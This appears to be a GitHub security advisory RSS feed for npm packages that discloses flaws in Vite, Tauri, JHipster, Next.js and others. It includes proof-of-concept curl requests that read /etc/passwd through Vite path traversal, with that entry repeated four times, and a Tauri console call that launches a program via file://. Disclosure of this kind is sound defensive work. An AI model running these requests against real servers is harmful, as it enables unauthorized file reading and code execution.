<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-04-05T00:04:51.676Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[expand-object] expand-object Vulnerable to Prototype Pollution via the expand() Function]]></title>
        <id>https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</id>
        <link href="https://github.com/advisories/GHSA-4vjr-hfpp-2m7w"/>
        <updated>2025-04-04T18:24:06.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package expand-object from 0.0.0 to 0.4.2 are vulnerable to Prototype Pollution in the expand() function in index.js. This function expands the given string into an object and allows a nested property to be set without checking the provided keys for sensitive properties like <strong>proto</strong>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3197">https://nvd.nist.gov/vuln/detail/CVE-2025-3197</a></li>
<li><a href="https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c">https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390">https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390</a></li>
<li><a href="https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13">https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13</a></li>
<li><a href="https://github.com/advisories/GHSA-4vjr-hfpp-2m7w">https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T06:34:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bigint-buffer] bigint-buffer Vulnerable to Buffer Overflow via toBigIntLE() Function]]></title>
        <id>https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</id>
        <link href="https://github.com/advisories/GHSA-3gc7-fjrx-p6mg"/>
        <updated>2025-04-04T18:23:46.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package bigint-buffer from 0.0.0 to 1.1.5 are vulnerable to Buffer Overflow in the toBigIntLE() function. Attackers can exploit this to crash the application.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3194">https://nvd.nist.gov/vuln/detail/CVE-2025-3194</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597">https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597</a></li>
<li><a href="https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf">https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf</a></li>
<li><a href="https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25">https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25</a></li>
<li><a href="https://github.com/advisories/GHSA-3gc7-fjrx-p6mg">https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-04T06:34:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-draft-wysiwyg] React Draft Wysiwyg Cross-Site Scripting (XSS) via the Embedded Button]]></title>
        <id>https://github.com/advisories/GHSA-fq5x-7292-2p5r</id>
        <link href="https://github.com/advisories/GHSA-fq5x-7292-2p5r"/>
        <updated>2025-04-04T18:23:09.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package react-draft-wysiwyg are vulnerable to Cross-site Scripting (XSS) via the Embedded button which will then result in saving the payload in the </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq5x-7292-2p5r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-04T06:34:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[generator-jhipster-entity-audit] generator-jhipster-entity-audit vulnerable to Unsafe Reflection when having Javers selected as Entity Audit Framework]]></title>
        <id>https://github.com/advisories/GHSA-7rmp-3g9f-cvq8</id>
        <link href="https://github.com/advisories/GHSA-7rmp-3g9f-cvq8"/>
        <updated>2025-04-04T14:06:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>CWE-470 (Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') when having Javers selected as Entity Audit Framework</p>
<h3 id="details">Details</h3>
<p>In the following two occurences, user input directly leads to class loading without checking against e.g. a whitelist of allowed classes. This is also known as CWE-470
<a href="https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88</a>
<a href="https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L124">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L124</a></p>
<p>So, if an attacker manages to place some malicious classes into the classpath and also has access to these REST interface for calling the mentioned REST endpoints, using these lines of code can lead to unintended remote code execution.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Place an arbitrary class with the right package name (starting with JHIpster applications path name) and make it available in class path</li>
<li>Gain access to view entity's audit changelogs (Role: ADMIN)</li>
<li>pass in the malicious class name part as <code>entityType</code> (first mentioned part) // <code>qualifiedName</code> (second mentioned occurence)</li>
<li>class gets loaded and static code blocks in there get executed</li>
</ol>
<p>--&gt; Should be limited to the already existing whitelist of classes (see first method in that mentioned class)</p>
<h3 id="impact">Impact</h3>
<p>Remote Code execution. You need to have some access to place malicious classes into the class path and you need to have a user with ADMIN role on the system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jhipster/generator-jhipster-entity-audit/security/advisories/GHSA-7rmp-3g9f-cvq8">https://github.com/jhipster/generator-jhipster-entity-audit/security/advisories/GHSA-7rmp-3g9f-cvq8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31119">https://nvd.nist.gov/vuln/detail/CVE-2025-31119</a></li>
<li><a href="https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88</a></li>
<li><a href="https://github.com/advisories/GHSA-7rmp-3g9f-cvq8">https://github.com/advisories/GHSA-7rmp-3g9f-cvq8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rmp-3g9f-cvq8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-04T14:06:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tauri-apps/plugin-shell] Improper Scope Validation in the `open` Endpoint of `tauri-plugin-shell`]]></title>
        <id>https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</id>
        <link href="https://github.com/advisories/GHSA-c9pr-q8gx-3mgp"/>
        <updated>2025-04-03T13:26:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Tauri <a href="https://tauri.app/plugin/shell/"><code>shell</code></a>  plugin exposes functionality to execute code and open programs on the system. The <a href="https://tauri.app/reference/javascript/shell/#open"><code>open</code></a> endpoint of this plugin is designed to allow open functionality with the system opener (e.g. 
 <code>xdg-open</code> on Linux). This was meant to be restricted to a reasonable number of protocols like <code>https</code> or <code>mailto</code> by default.</p>
<p>This default restriction was not functional due to improper validation of the allowed protocols, allowing for potentially dangerous protocols like <code>file://</code>, <code>smb://</code>, or <code>nfs://</code> and others  to be opened by the system registered protocol handler.</p>
<p>By passing untrusted user input to the <code>open</code> endpoint these potentially dangerous protocols can be abused to gain remote code execution on the system. This either requires direct exposure of the endpoint to application users or code execution in the frontend of a Tauri application.</p>
<p>You are not affected if you have explicitly configured a validation regex or manually set the <code>open</code> endpoint to <code>true</code> in the plugin configuration. </p>
<p>Technically the scope was never a limitation for the rust side as it is not seen as an enforceable security boundary but we decided to mark the rust crate as affected since the plugin does not need to be a frontend dependency to be exposed.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in the <code>2.2.1</code> version of the plugin.
The plugin now differentiates between an unset scope and an explicit validation disable for the <code>open</code> endpoint.</p>
<h3 id="workarounds">Workarounds</h3>
<p>A way to prevent arbitrary protocols would be setting the shell plugin configuration value <code>open</code> to <code>true</code>.</p>
<p><code>tauri.conf.json</code></p>
<pre><code class="language-json5">"plugins": {
    "shell": {
          "open": true
     },
}
</code></pre>
<p>The above will only allow <code>mailto</code>, <code>http</code> and <code>https</code> links to be opened.</p>
<p>If the <code>open</code> endpoint should not be allowed at all there are two possible workarounds.</p>
<ul>
<li>Defining a non matching regex like <code>tauri^</code> in the plugin configuration</li>
<li>Removing <code>shell:default</code> and all instances of <code>shell:allow-open</code> from the <a href="https://tauri.app/security/capabilities/"><code>capabilities</code></a></li>
</ul>
<p>Alternatively we recommend usage of the <a href="https://tauri.app/plugin/opener/"><code>opener</code></a>  plugin, as the shell plugin deprecated the <code>open</code> endpoint previously.</p>
<h3 id="references">References</h3>
<h4 id="poc">PoC</h4>
<p>This is a windows specific proof of concept.</p>
<ol>
<li>Use <code>create-tauri-app</code> to make a new Tauri app.</li>
<li>Run <code>tauri add shell</code> to add the shell plugin.</li>
<li>Execute <code>await window.__TAURI_INTERNALS__.invoke("plugin:shell|open", {path: "file:///c:/windows/system32/calc.exe"});</code> in the developer console.</li>
<li>Observe the calculator being executed</li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp">https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp</a></li>
<li><a href="https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c">https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31477">https://nvd.nist.gov/vuln/detail/CVE-2025-31477</a></li>
<li><a href="https://github.com/advisories/GHSA-c9pr-q8gx-3mgp">https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-02T22:36:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
